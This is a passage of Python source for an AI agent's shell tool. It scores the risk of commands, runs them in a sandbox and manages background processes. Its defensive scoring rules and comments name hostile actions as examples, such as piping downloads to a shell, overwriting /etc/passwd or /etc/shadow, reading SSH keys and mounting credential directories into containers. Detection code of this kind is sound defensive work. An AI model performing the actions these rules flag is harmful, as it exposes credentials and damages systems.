        for pid, proc in list(self._background.items()):
            if proc.returncode is None:
                await _kill_proc_tree(proc)
            if proc.returncode is not None:
                self._background.pop(pid, None)
                self._background_owner.pop(pid, None)
                killed += 1
        return killed

    async def kill_background_for_session(self, session_id: str) -> int:
        """Kill background processes started by one session (per-run teardown).

        Reaps only the shells this session/run launched (tagged at spawn), so a
        finished workflow run cleans up its own servers/watchers without touching
        other runs' background processes. Survivors stay in the dict for retry.
        """
        sid = str(session_id or "").strip()
        if not sid:
            return 0
        killed = 0
        for pid, proc in list(self._background.items()):
            if self._background_owner.get(pid) != sid:
                continue
            if proc.returncode is None:
                await _kill_proc_tree(proc)
            if proc.returncode is not None:
                self._background.pop(pid, None)
                self._background_owner.pop(pid, None)
                killed += 1
        return killed

    @property
    def metadata(self) -> ToolMetadata:
        return ToolMetadata(timeout=600, streaming=True)

    def assess_risk(self, args: dict[str, Any]) -> RiskAssessment:
        command = (args.get("command", "") or "").strip()
        if not command:
            return RiskScore(0, reason="Empty command")
        # Redacted command for use in prompt/reason strings (visible in UI/logs/LLM).
        # Original `command` is still used for pattern matching above.
        safe_cmd = redact_credentials(command)

        # ── Deny patterns → 10 (except curl|sh which is handled below) ──
        # curl|sh is caught by _SHELL_CURL_PIPE at score 9 before deny check
        if _SHELL_CURL_PIPE.search(command):
            return RiskScore(9, reason=f"Pipe download to shell: {safe_cmd}")

        matched = self._sandbox.match_deny_pattern(command)
        if matched:
            return RiskScore(10, reason=f"Matches deny pattern: {matched}")

        # ── Compound / redirect / pipe pre-checks ────────────────────────
        # These must run BEFORE command-specific patterns (info, search, PS
        # read) to prevent `echo > /etc/passwd` or `Get-X | Remove-X` from
        # being short-circuited at a low score.

        # System redirect anywhere in command → LLM (elevated range)
        if _SHELL_REDIRECT_SYSTEM.search(command):
            return RiskPrompt(
                context=f"Shell command with system redirect: {safe_cmd}",
                range=(7, 9),
                signals=("system-redirect",),
                factors=(
                    "7: Append to system log file",
                    "8: Overwrite system config (/etc/hosts, /etc/resolv.conf)",
                    "9: Overwrite critical system file (/etc/passwd, /etc/shadow)",
                ),
            )

        # Any other redirect (> or >>) outside quotes → LLM (write operation)
        # Catches `echo x > file.txt` which is score 2-3, not 0.
        if _has_unquoted_redirect(command):
            return RiskPrompt(
                context=f"Shell command with output redirect: {safe_cmd}",
                range=(2, 5),
                factors=(
                    "2: Redirect to workspace temp/output file",
                    "3: Redirect overwriting existing workspace file",
                    "5: Redirect to user config or sensitive path",
                ),
            )

        # Pipe to interpreter → LLM
        if _SHELL_PIPE_EXEC.search(command):
            return RiskPrompt(
                context=f"Shell command pipes to interpreter: {safe_cmd}",
                range=(5, 8),
                factors=(
                    "5: Pipe of known safe content (e.g. echo literal | python -c)",
                    "6: Pipe from local file to interpreter",
                    "7: Pipe from network source or dynamic content",
                    "8: Pipe with elevated privileges or to system shell",
                ),
            )

        # Compound command (|, &&, ;, &) outside quotes → LLM for full
        # evaluation.  Must go to LLM before simple matchers to prevent e.g.
        # `echo x | sudo tee /etc/hosts` from being caught by _SHELL_INFO.
        # Quote-aware: `grep 'a|b'` and `curl "?a=1&b=2"` are NOT compound.
        # Note: escaped quotes (\" inside double-quotes) may cause false positives
        # (routing safe commands to LLM unnecessarily) — this is a safe failure.
        #
        # ``saw_separator`` (not ``len(segments) > 1``) is the compound signal:
        # ``cmd &`` (background execution) has one non-empty segment but the
        # trailing ``&`` decouples the child from the parent shell and must
        # still take the compound path.  Same for ``cmd ;`` / ``;cmd``.
        segments, is_compound = _split_compound_segments(command)
        if is_compound:
            # Optimization: if every segment is independently classifiable as a
            # deterministic RiskScore ≤ 3, take max(scores) + 1 (capped at 4)
            # and skip the LLM round-trip.  Saves ~1-2s for benign chains like
            # `git status && git diff` or `mkdir x && cp y x`.
            seg_scores: list[int] = []
            short_circuit = True
            for seg in segments:
                seg_assess = self.assess_risk({"command": seg})
                if (
                    isinstance(seg_assess, RiskScore)
                    and seg_assess.score is not None
                    and seg_assess.score <= 3
                ):
                    seg_scores.append(seg_assess.score)
                else:
                    short_circuit = False
                    break
            if short_circuit and seg_scores:
                combined = min(max(seg_scores) + 1, 4)
                return RiskScore(
                    combined,
                    reason=f"Compound of {len(segments)} deterministic ops (max+1): {safe_cmd}",
                )
            return RiskPrompt(
                context=f"Compound shell command: {safe_cmd}",
                range=(2, 8),
                factors=(
                    "2: Chained read-only commands (pwd && ls, git status && echo done)",
                    "4: Chain includes local write (mkdir && cp, ls | tee file)",
                    "6: Chain includes network or external side-effect",
                    "7: Chain includes destructive or system-impacting operation",
                    "8: Chain with elevated privileges or system file writes",
                ),
            )

        # ── Git commands (order: force → push → remote → read → write) ──
        if _SHELL_GIT_FORCE.match(command):
            return RiskScore(7, reason=f"Git force/destructive: {safe_cmd}")
        if _SHELL_GIT_PUSH.match(command):
            return RiskScore(6, reason=f"Git push: {safe_cmd}")
        if _SHELL_GIT_REMOTE.match(command):
            return RiskScore(4, reason=f"Git remote operation: {safe_cmd}")
        if _SHELL_GIT_READ.match(command):
            return RiskScore(0, reason=f"Git read-only: {safe_cmd}")
        if _SHELL_GIT_WRITE.match(command):
            return RiskScore(3, reason=f"Git local write: {safe_cmd}")

        # ── File-reading commands → score based on file path ─────────────
        from praestoclaw.agent.tools.filesystem import path_risk_level

        m = _SHELL_FILE_READ.match(command)
        if m:
            target = m.group(2).split()[0].strip("'\"")  # first argument
            _, read_score, _ = path_risk_level(target)
            return RiskScore(read_score, reason=f"Read file: {target}")

        m = _SHELL_DIR_READ.match(command)
        if m:
            target = (m.group(2) or ".").split()[0].strip("'\"")
            category, _, _ = path_risk_level(target)
            if category == "credential":
                return RiskScore(4, reason=f"List credential dir: {target}")
            if category == "system":
                return RiskScore(3, reason=f"List system dir: {target}")
            if category in ("user_secret", "project_secret"):
                return RiskScore(1, reason=f"List {category} dir: {target}")
            return RiskScore(0, reason=f"Read-only: {safe_cmd}")

        # Pure info commands → 0
        if _SHELL_INFO.match(command):
            return RiskScore(0, reason="Info command")

        # Search commands → 1 (read-only but may scan file contents)
        if _SHELL_SEARCH.match(command):
            return RiskScore(1, reason="Search command")

        # cd → 0
        if _SHELL_CD.match(command):
            return RiskScore(0, reason="Change directory")

        # Package info — local queries → 0, network queries → 1
        if _SHELL_PKG_LOCAL.match(command):
            return RiskScore(0, reason="Package info (local)")
        if _SHELL_PKG_NETWORK.match(command):
            return RiskScore(1, reason=f"Package info (network query): {safe_cmd}")

        # ── Dev tools ────────────────────────────────────────────────────
        if _SHELL_TOOLCHAIN_INFO.match(command):
            return RiskScore(0, reason="Toolchain version/info query")

        if _SHELL_LINTER.match(command):
            return RiskScore(2, reason="Linter (read-only analysis)")

        if _SHELL_PROJECT_INIT.match(command):
            return RiskScore(2, reason="Project scaffolding")

        if _SHELL_TEST.match(command):
            return RiskScore(3, reason="Test runner (may modify files)")

        if _SHELL_FORMATTER.match(command):
            return RiskScore(3, reason="Formatter (modifies files in place)")

        if _SHELL_BUILD.match(command):
            return RiskScore(3, reason="Build/compile command")

        # File creation → 1
        if _SHELL_FILE_CREATE.match(command):
            return RiskScore(1, reason=f"Create file/directory: {safe_cmd}")

        # File copy/move → 2
        if _SHELL_FILE_COPY.match(command):
            return RiskScore(2, reason=f"Copy/move file: {safe_cmd}")

        # Archive / compression → 2
        if _SHELL_ARCHIVE.match(command):
            return RiskScore(2, reason=f"Archive/compression: {safe_cmd}")

        # Script file execution → 3 (known file, can't see content)
        if _SHELL_SCRIPT_FILE.match(command):
            return RiskScore(3, reason=f"Script file execution: {safe_cmd}")

        # ── Install / package management ─────────────────────────────────
        # Order matters: lockfile/editable variants first (deterministic 3),
        # then remote registry installs (floor 6, supply-chain), then `make`
        # (generic, content-dependent).  Checked BEFORE inline exec so
        # `python -m pip install` uses the install path.

        # Reproducible / editable install (lockfile, -e, -r) → 3
        if _SHELL_INSTALL_LOCKFILE.match(command):
            return RiskScore(3, reason=f"Reproducible/editable install: {safe_cmd}")

        # Remote install of arbitrary package — floor 6, never auto in standard.
        # The LLM still picks 6/7/8 based on package name and flags, but it
        # cannot drop below 6 — supply-chain compromise of a "well-known"
        # package (e.g. typosquat) shouldn't auto-execute install scripts.
        if _SHELL_INSTALL_REMOTE.match(command):
            return RiskPrompt(
                context=f"Remote package install (supply-chain): {safe_cmd}",
                range=(6, 8),
                signals=("install", "supply-chain"),
                factors=(
                    "6: Well-known package from official registry (requests, lodash, axios)",
                    "7: Less common name, --pre/--force/--no-deps flag, or system-wide install",
                    "8: Install from arbitrary URL/git, name looks typosquatted, or pre-/post-install scripts run",
                ),
            )

        # Docker/podman with host volume mount — privilege escalation surface.
        if _SHELL_DOCKER_PRIVILEGED.match(command):
            return RiskScore(8, reason=f"Container with host privileges: {safe_cmd}")
        if _SHELL_DOCKER_VOLUME.match(command):
            return RiskPrompt(
                context=f"Container with host volume mount: {safe_cmd}",
                range=(6, 9),
                signals=("docker", "host-mount"),
                factors=(
                    "6: Mount workspace dir (read-write of project files)",
                    "7: Mount user-home subdir (~/Documents, ~/Downloads)",
                    "8: Mount sensitive dir (~/.ssh, ~/.aws, ~/.kube, /var/run/docker.sock)",
                    "9: Mount system root (/, C:\\Windows, /etc, host root)",
                ),
            )

        # Generic `make <target>` — content-dependent (Makefile drives risk).
        if _SHELL_MAKE.match(command):
            return RiskPrompt(
                context=f"Make target: {safe_cmd}",
                range=(3, 7),
                signals=("make",),
                factors=(
                    "3: Known build/test target (make build, make test, make lint)",
                    "5: Deploy / release / publish target",
                    "7: System install target (make install) or unknown destructive target",
                ),
            )

        # Inline / dynamic code execution → LLM (evaluate the code content)
        # Floor at 2 (not 0) so profile-aware fallback is never dangerously low.
        # LLM can still score below 2 per "unless clearly warranted" clause.
        if _SHELL_INLINE_EXEC.match(command):
            return RiskPrompt(
                context=f"Inline code execution: {safe_cmd}",
                range=(2, 7),
                factors=(
                    "2: Read-only (print, stat, list, path check, datetime, type check)",
                    "3: Local file write or modification",
                    "5: Network request, package operation, or external side-effect",
                    "7: System modification, destructive operation, or eval/exec of dynamic input",
                ),
            )

        # PowerShell cmdlet (Get-*/Test-*/Select-*/...) → LLM for path-aware scoring.
        # Get-Content ~/.ssh/id_rsa differs from Get-Content README.md.
        # Skip if command contains unquoted pipe — `Get-X | Stop-X` must go to
        # ambiguous section. Quoted pipes (Select-String "a|b") are fine.
        if _SHELL_PS_READ.match(command) and not _has_unquoted_compound(command):
            return RiskPrompt(
                context=f"PowerShell cmdlet: {safe_cmd}",
                range=(0, 3),
                factors=(
                    "0: Read workspace file, list workspace dir, get date/version",
                    "1: Read user config (~/.gitconfig, ~/.bashrc)",
                    "2: Read system path (/etc, C:\\Windows) or list sensitive dir",
                    "3: Read credential/secret file (~/.ssh/*, .env, *token*)",
                ),
            )

        # PowerShell parenthesized expressions — may hide side effects after a
        # read cmdlet, e.g. (Get-Item ...).Delete(), so route to LLM.
        if _SHELL_PS_EXPR_READ.match(command):
            return RiskPrompt(
                context=f"PowerShell expression: {safe_cmd}",
                range=(0, 7),
                factors=(
                    "0: Simple property access or read-only inspection",
                    "3: Local file modification or rename",
                    "5: External side effect or command invocation",
                    "7: Destructive method (.Delete(), Remove-Item) or system modification",
                ),
            )

        # GitHub CLI read → 1
        if _SHELL_GH_READ.match(command):
            return RiskScore(1, reason=f"GitHub CLI read: {safe_cmd}")

        # gh repo clone → 4 (consistent with git clone)
        if _SHELL_GH_CLONE.match(command):
            return RiskScore(4, reason=f"GitHub CLI clone: {safe_cmd}")

        # GitHub CLI write → 6 (externally visible; pr merge / release create
        # are effectively irreversible on shared repos).  Timeout-auto in
        # standard ensures the user has a chance to intervene.
        if _SHELL_GH_WRITE.match(command):
            return RiskScore(6, reason=f"GitHub CLI write: {safe_cmd}")

        # Arbitrary code execution → LLM (4~8)
        if _SHELL_EXEC_ARBITRARY.match(command):
            return RiskPrompt(
                context=f"Shell command: {safe_cmd}",
                range=(4, 8),
                signals=("arbitrary code execution",),
                factors=(
                    "4: Run well-known project entry point (dotnet run, npx tsc)",
                    "5: Run local project script with known purpose",
                    "6: Run third-party package directly (npx unknown-tool)",
                    "7: Run with elevated access or network-facing flags",
                    "8: Run untrusted code, or --dangerously/--no-verify flags",
                ),
            )

        # Publish / DB migration → LLM (5~8)
        if _SHELL_PUBLISH.match(command):
            return RiskPrompt(
                context=f"Shell command: {safe_cmd}",
                range=(5, 8),
                signals=("publish", "deploy", "migrate"),
                factors=(
                    "5: Publish to private/internal registry or dry-run",
                    "6: Publish to public registry (npm, NuGet) with scope/org",
                    "7: DB migration on dev/staging, or publish without scope",
                    "8: DB migration on production, or publish overwriting existing version",
                ),
            )

        # ── Delete commands — classified by target ────────────────────────
        if _SHELL_CLEANUP.match(command):
            return RiskScore(4, reason=f"Cleanup build artifacts / temp files: {safe_cmd}")
        if _SHELL_RM_RF.match(command):
            return RiskScore(7, reason=f"Recursive force delete: {safe_cmd}")
        if _SHELL_RM.match(command):
            return RiskScore(6, reason=f"Delete file/directory: {safe_cmd}")

        # ── Ambiguous — collect hints, compute range, then build factors ──
        hints: list[str] = []
        lo, hi = 3, 6
        if _SHELL_NETWORK.search(command):
            hints.append("network")
            lo, hi = max(lo, 4), max(hi, 7)
        if _SHELL_DELETE.search(command):
            hints.append("delete")
            lo, hi = max(lo, 4), max(hi, 7)
        if _SHELL_ELEVATED.search(command):
            hints.append("elevated")
            lo, hi = max(lo, 6), max(hi, 9)
        # Note: system-redirect is caught by the early pre-check above
        # and never reaches this ambiguous section.

        # Use "Lower/Higher" labels — numeric prefixes would be misleading
        # when multiple hints shift lo/hi (e.g. delete+elevated → lo=6 but
        # "6: Delete temp file" doesn't make sense).
        factors: list[str] = []
        if "network" in hints:
            factors.append("Lower: read-only GET/fetch, downloading docs/data")
            factors.append("Higher: POST/PUT to API, uploading data, internal services")
        if "delete" in hints:
            factors.append("Lower: delete single temp file, git-restorable workspace file")
            factors.append("Higher: delete directory tree, non-recoverable files, system paths")
        if "elevated" in hints:
            factors.append("Lower: install system package (apt/brew) for dev tooling")
            factors.append("Higher: modify system config, change permissions, manage services")

        return RiskPrompt(
            context=f"Shell command: {safe_cmd}",
            range=(lo, hi),
            signals=tuple(hints),
            factors=tuple(factors),
        )

    @property
    def name(self) -> str:
        return "shell"

    @property
    def description(self) -> str:
        return "Execute a shell command."

    @property
    def parameters(self) -> dict[str, Any]:
        default_shell = "cmd" if _IS_WINDOWS else "bash"
        return {
            "type": "object",
            "properties": {
                "command": {
                    "type": "string",
                    "description": "The command to execute.",
                },
                "timeout": {
                    "type": "integer",
                    "description": (
                        "Timeout in seconds. Default: 600 (10 min). Max for synchronous mode: 600 — "
                        "larger values are capped. For any command expected to run longer than "
                        "~10 minutes (long builds, repo analysis, bulk data jobs), you MUST pass "
                        "timeout=0 to run in background mode: spawn returns immediately with the "
                        "PID, the process keeps running, and you check progress via its own log/state "
                        "files. Synchronous calls that exceed 600s are force-terminated "
                        "(taskkill /F /T on Windows, SIGKILL on POSIX)."
                    ),
                },
                "directory": {
                    "type": "string",
                    "description": (
                        "Working directory (relative to workspace). Omit this field, or use "
                        "'.' or 'workspace', for the workspace root."
                    ),
                },
                "shell": {
                    "type": "string",
                    "description": f"Shell to use: auto (default, OS default = {default_shell}), bash, cmd, powershell, or a path.",
                },
            },
            "required": ["command"],
        }

    async def execute(self, **kwargs: Any) -> str:
        command: str = kwargs["command"]
        max_timeout = self.metadata.timeout  # 600s from ToolMetadata
        raw_timeout = kwargs.get("timeout")
        background = raw_timeout == 0
        timeout: float | None = (
            None
            if raw_timeout is None
            else (None if background else min(max(int(raw_timeout), 1), max_timeout))
        )
        if timeout is None and not background:
            timeout = max_timeout
        directory: str = str(kwargs.get("directory") or "")
        if directory.strip().lower() == "workspace":
            directory = ""
        shell_mode: str = kwargs.get("shell", "auto")

        # Security check
        try:
            self._sandbox.check_command(command)
        except CommandDeniedError as exc:
            return f"BLOCKED: {exc}"

        # PraestoClaw must never self-update / self-install from a tool — the
        # spawned updater would die with the turn on interrupt. Unconditional:
        # not overridable by approval, runs before the command is launched.
        if _is_self_update_command(command):
            return _SELF_UPDATE_BLOCK_MESSAGE

        # Resolve working directory
        if directory:
            try:
                cwd = self._sandbox.resolve_path(directory)
            except PathDeniedError as exc:
                return f"BLOCKED: {exc}"
            if not cwd.is_dir():
                return f"Error: directory '{directory}' does not exist"
        else:
            cwd = self._sandbox.workspace

        # Resolve shell executable
        shell_exe, shell_args = _resolve_shell(shell_mode)

        creationflags = _WIN_CREATE_NEW_PROCESS_GROUP if _needs_console_isolation(command) else 0
        subprocess_kwargs: dict[str, Any] = {"creationflags": creationflags}
        if not _IS_WINDOWS:
            # Put each shell tool invocation in its own POSIX process group so
            # timeout/cancel cleanup can kill descendants, not just the shell
            # wrapper. This prevents orphaned grandchildren such as ffmpeg
            # continuing after the daemon or wrapper exits.
            subprocess_kwargs["start_new_session"] = True

        # Background mode must redirect child stdio to a file, not a pipe.
        # Background callers register the PID in self._background and return
        # immediately, so nothing in the agent process drains the pipe.
        # A long-lived child that keeps logging (e.g. repo_analysis analyzer)
        # would block on write once the ~64 KB Windows pipe buffer fills,
        # taking down the entire child via loguru/asyncio deadlock.
        bg_log_file = None
        bg_log_path: Path | None = None
        if background:
            # Use get_data_dir() so the override set via set_data_dir() and the
            # staging convention (~/.praestoclaw-staging) are honoured; manually
            # parsing PRAESTOCLAW_DATA_DIR would scatter shell-bg logs into the
            # wrong directory under either of those configurations.
            bg_log_dir = ensure_dir(get_data_dir() / "logs" / "shell-bg")
            # Filename must be unique even when two background tasks start in
            # the same wall-clock second; second-resolution alone collides.
            ts = time.strftime("%Y%m%dT%H%M%S")
            uniq = f"{os.getpid()}-{time.monotonic_ns() & 0xFFFFFF:06x}"
            candidate_path = bg_log_dir / f"{ts}-{uniq}.log"
            # Best-effort log capture: if the FS is read-only or permissions
            # block creation, fall back to DEVNULL so the background command
            # still launches. Losing log capture is preferable to losing the
            # ability to spawn long-running jobs entirely.
            try:
                bg_log_file = open(candidate_path, "ab", buffering=0)  # noqa: SIM115 - closed in finally
                bg_log_path = candidate_path
                stdout_target: Any = bg_log_file
            except OSError as exc:
                logger.warning(
                    "shell: cannot open background log {} ({}); running without log capture",
                    candidate_path,
                    exc,
                )
                stdout_target = asyncio.subprocess.DEVNULL
            stderr_target: Any = asyncio.subprocess.STDOUT
        else:
            stdout_target = asyncio.subprocess.PIPE
            stderr_target = asyncio.subprocess.PIPE

        proc: asyncio.subprocess.Process | None = None
        try:
            if self._sandbox.os_sandbox_active:
                # OS sandbox is enabled: we must spawn via create_subprocess_exec
                # so the wrapper can prefix argv. If the user picked ``auto`` and
                # _resolve_shell returned (None, []), force an explicit shell.
                if shell_exe is None:
                    shell_exe, shell_args = _force_explicit_shell()
                argv = [shell_exe, *shell_args, command]
                # Only widen the OS-sandbox writable set with cwd when it
                # lives INSIDE the workspace. Allowing arbitrary cwds
                # (which the Python-layer sandbox may permit) to become
                # writable at the kernel layer would silently undermine
                # workspace_write semantics.
                extra_writable: tuple[Path, ...] = ()
                try:
                    cwd.resolve().relative_to(self._sandbox.workspace)
                    extra_writable = (cwd,)
                except ValueError:
                    # cwd is outside the workspace — do not widen the
                    # writable set; the user must add it to writable_roots.
                    pass
                argv, child_env = self._sandbox.wrap_argv(
                    argv,
                    cwd=cwd,
                    env=os.environ,
                    extra_writable=extra_writable,
                )
                proc = await asyncio.create_subprocess_exec(
                    *argv,
                    stdout=stdout_target,
                    stderr=stderr_target,
                    cwd=str(cwd),
                    env=child_env,
                    creationflags=creationflags,
                )
            elif shell_exe:
                # Explicit shell requested (bash/cmd/powershell/path) but no OS
                # sandbox — preserve the exact legacy spawn shape.
                proc = await asyncio.create_subprocess_exec(
                    shell_exe,
                    *shell_args,
                    command,
                    stdout=stdout_target,
                    stderr=stderr_target,
                    cwd=str(cwd),
                    env={**os.environ},
                    **subprocess_kwargs,
                )
            else:
                # Legacy ``auto`` path with no OS sandbox: byte-identical to
                # the pre-os_sandbox behaviour. Windows users in particular
                # depend on subprocess's cmd.exe quoting here.
                proc = await asyncio.create_subprocess_shell(
                    command,
                    stdout=stdout_target,
                    stderr=stderr_target,
                    cwd=str(cwd),
                    env={**os.environ},
                    **subprocess_kwargs,
                )

            # Background mode: return immediately with PID
            if background:
                # Parent-side fd no longer needed; child has its own dup.
                if bg_log_file is not None:
                    bg_log_file.close()
                    bg_log_file = None
                # Clean up finished background processes
                self._background = {
                    pid: p for pid, p in self._background.items() if p.returncode is None
                }
                # Keep the owner map in sync — drop entries for the pruned (finished)
                # pids so _background_owner can't grow unbounded over the process life.
                self._background_owner = {
                    pid: sid
                    for pid, sid in self._background_owner.items()
                    if pid in self._background
                }
                if len(self._background) >= self._MAX_BACKGROUND:
                    return (
                        f"Error: max {self._MAX_BACKGROUND} background processes. "
                        f"Running: {', '.join(str(p) for p in self._background.keys())}"
                    )
                pid = proc.pid
                self._background[pid] = proc
                self._background_owner[pid] = str(kwargs.get("_session_id") or "").strip()
                stop_cmd = f"taskkill /F /T /PID {pid}" if _IS_WINDOWS else f"kill -TERM -- -{pid}"
                log_line = (
                    f"Stdout+stderr: {bg_log_path}"
                    if bg_log_path is not None
                    else "Stdout+stderr: discarded (log file could not be opened; see warnings)"
                )
                return (
                    f"Background process started: PID {pid}\n"
                    f"Command: {command}\n"
                    f"{log_line}\n"
                    f"Use shell(command='{stop_cmd}') to stop."
                )

            # Stream stdout line-by-line when progress callback is available
            if self._progress and proc.stdout:
                stdout_lines: list[str] = []
                # Progress emission is purely for "tool is alive" UX — every
                # line is rendered into a single-row card on Teams via
                # updateActivity. Dump-style commands (e.g. `praestoclaw
                # logs -n 200`, `cat`, `tail`) would otherwise flood the
                # bridge with hundreds of near-instant updates, making the
                # card look like a runaway log loop. Cap the *total*
                # characters emitted via progress; once exceeded, keep
                # buffering stdout silently for the final result.
                _PROGRESS_EMIT_BUDGET = 200
                emitted_chars = 0
                try:

                    async def _read_stdout() -> None:
                        nonlocal emitted_chars
                        assert proc.stdout is not None
                        while True:
                            line = await proc.stdout.readline()
                            if not line:
                                break
                            decoded = line.decode("utf-8", errors="replace")
                            stdout_lines.append(decoded)
                            if self._progress and emitted_chars < _PROGRESS_EMIT_BUDGET:
                                emitted_chars += len(decoded)
                                await self._progress(decoded)

                    async def _read_stderr() -> bytes:
                        assert proc.stderr is not None
                        return await proc.stderr.read()

                    stderr_bytes, _ = await asyncio.wait_for(
                        asyncio.gather(_read_stderr(), _read_stdout()),
                        timeout=timeout,
                    )
                except TimeoutError:
                    await _kill_proc_tree(proc)
                    return f"Command timed out after {timeout}s"

                await proc.wait()
                stdout_text = "".join(stdout_lines)
                stderr_text = stderr_bytes.decode("utf-8", errors="replace") if stderr_bytes else ""
            else:
                # Non-streaming path
                try:
                    stdout_raw, stderr_raw = await asyncio.wait_for(
                        proc.communicate(),
                        timeout=timeout,
                    )
                except TimeoutError:
                    await _kill_proc_tree(proc)
                    return f"Command timed out after {timeout}s"
                stdout_text = stdout_raw.decode("utf-8", errors="replace") if stdout_raw else ""
                stderr_text = stderr_raw.decode("utf-8", errors="replace") if stderr_raw else ""

            output_parts: list[str] = []
            if stdout_text:
                output_parts.append(stdout_text)
            if stderr_text:
                output_parts.append(stderr_text)

            output = "\n".join(output_parts).strip() or "(no output)"

            if proc.returncode != 0:
                if self._sandbox.os_sandbox_active and self._sandbox.is_sandbox_denied_output(
                    stderr_text, proc.returncode
                ):
                    output = f"[sandbox-denied] Exit code {proc.returncode}\n{output}"
                else:
                    output = f"Exit code {proc.returncode}\n{output}"

            return output

        except asyncio.CancelledError:
            if proc is not None and proc.returncode is None:
                await _kill_proc_tree(proc)
            raise
        except Exception as exc:
            return f"Shell error: {exc}"
        finally:
            if bg_log_file is not None:
                try:
                    bg_log_file.close()
                except Exception:
                    pass
